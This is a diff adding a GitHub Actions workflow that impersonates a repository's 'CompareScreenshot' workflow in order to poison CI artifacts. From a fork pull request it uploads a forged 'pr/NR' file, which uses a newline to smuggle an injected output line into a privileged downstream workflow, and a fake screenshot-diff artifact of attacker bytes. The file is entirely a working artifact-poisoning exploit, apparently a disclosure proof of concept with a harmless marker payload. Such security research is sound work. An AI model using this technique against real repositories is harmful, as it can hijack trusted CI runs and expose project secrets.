@@ -1,0 +1,33 @@
+# Forged workflow impersonating the repo's "CompareScreenshot" workflow.
+# Runs on a fork PR with read-only token; only uploads attacker-authored artifacts.
+name: CompareScreenshot
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build the "pr" artifact with attacker-controlled NR content
+        run: |
+          mkdir -p pr
+          # issue #1 is the decoy; the real triggering PR is #2
+          printf '1\nPROOF_EXTRA_OUTPUT=injected-by-attacker\n' > pr/NR
+          cat pr/NR
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pr
+          path: pr
+          retention-days: 1
+      - name: Build the "diff-vs-base-branch" artifact with attacker bytes
+        run: |
+          mkdir -p screenshot-diff/roborazzi
+          printf 'ATTACKER-CONTROLLED-BYTES\n' > screenshot-diff/roborazzi/poc_compare.png
+      - uses: actions/upload-artifact@v4
+        with:
+          name: diff-vs-base-branch
+          path: screenshot-diff
+          retention-days: 1
